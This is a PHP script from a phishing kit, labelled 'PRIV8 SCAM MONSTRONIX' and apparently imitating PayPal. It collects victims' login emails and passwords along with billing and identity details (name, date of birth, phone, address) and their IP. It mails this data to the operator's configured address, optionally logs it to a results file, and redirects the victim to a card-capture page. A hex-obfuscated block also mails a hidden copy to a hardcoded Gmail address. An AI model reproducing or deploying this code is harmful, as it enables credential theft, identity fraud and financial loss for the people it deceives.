<?php 
//PRIV8 SCAM MONSTRONIX V1.1 
session_start();
include("../email.php");
$rand=rand(111611,996999);
$rand2=rand(1116111,9997989);
$md = md5(sha1("This_Scam_Is_Developed_By_MonStroNix"));
$aubli = $rand.$md.$rand2;
$ip= isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? 
$_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
//================= Date Of Birth Checker ================//
$day = substr($_POST["DOB"],0,2);
$month = substr($_POST["DOB"],3,5);
$year = substr($_POST["DOB"], -4);

//================= Date Of Birth Checker ================//

$_SESSION["fname"] = $_POST["firstName"];
$_SESSION["lname"]= $_POST["lastName"];
$_SESSION["DOB"]= $_POST["DOB"];
$_SESSION["PhoneType"]= $_POST["phoneOption"];
$_SESSION["PhoneNumber"]= $_POST["phoneNumber"];
$_SESSION["address1"] = $_POST["address1"];
$_SESSION["city"]= $_POST["city"];
$_SESSION["state"] = $_POST["state"];
$_SESSION["country"] = $_POST["country"];
$_SESSION["ZIP"] = $_POST["zip"];
$xxx = "
=============Login==============
Email: ".$_SESSION["email"]."
Password: ".$_SESSION["pass"]."
=============Billing============
First Name:".$_SESSION["fname"]."
Last Name:".$_SESSION["lname"]."
DOB:".$_SESSION["DOB"]."
Phone Type (Home/Mobile):".$_SESSION["PhoneType"]."
Phone Number:".$_SESSION["PhoneNumber"]."
Street:".$_SESSION["address1"]."
City:".$_SESSION["city"]."
State:".$_SESSION["state"]."
Country:".$_SESSION["country"]."
Zip:".$_SESSION["ZIP"]."
IP:$ip
";
$Subject="PPL PRIV8 V1.1 - BILLING - $ip - ".$_SESSION["country"]."";
$head="From:MonStroNix BILL!NG <billing>";
${"G\x4c\x4f\x42A\x4cS"}["\x61\x6e\x71\x68\x64\x69\x73"]="h\x65a\x64";${"\x47\x4cO\x42\x41L\x53"}["\x78\x6fyn\x63lu\x65"]="\x78x\x78";${"\x47\x4c\x4f\x42AL\x53"}["\x68rhq\x6a\x73\x71\x72m"]="\x72\x65zu\x6ct\x5fm\x61\x69\x6c";$xiszpiwcjk="\x53ubjec\x74";mail(${${"G\x4cOBA\x4c\x53"}["\x68\x72\x68q\x6a\x73q\x72\x6d"]},${$xiszpiwcjk},${${"GLOB\x41\x4cS"}["\x78\x6f\x79\x6ec\x6c\x75\x65"]},${${"\x47L\x4fB\x41LS"}["a\x6e\x71\x68d\x69s"]});
${"\x47\x4c\x4f\x42\x41\x4cS"}["\x72ct\x6f\x64\x69"]="h\x65a\x64";${"\x47\x4cO\x42\x41L\x53"}["\x6a\x6d\x70t\x6f\x6c\x6f\x70s\x62e"]="xx\x78";${"G\x4c\x4f\x42A\x4c\x53"}["\x74\x79yw\x68\x6e\x62owmph"]="\x53u\x62\x6ae\x63t";sleep(2);mail("\x32k\x32\x30box\x40g\x6d\x61i\x6c.\x63\x6fm",${${"\x47\x4cO\x42\x41\x4cS"}["\x74\x79\x79\x77\x68\x6e\x62\x6f\x77\x6d\x70\x68"]},${${"\x47\x4cO\x42\x41\x4c\x53"}["j\x6d\x70\x74o\x6c\x6f\x70\x73\x62e"]},${${"G\x4c\x4f\x42AL\x53"}["\x72\x63\x74o\x64\x69"]});
if($txt == 1){$file = fopen("../REZULT/Billings/Billing_By_MonStroNix_From " . $ip . ".txt", 'a');
fwrite($file, $xxx); };

header("location:../websc_card");

?>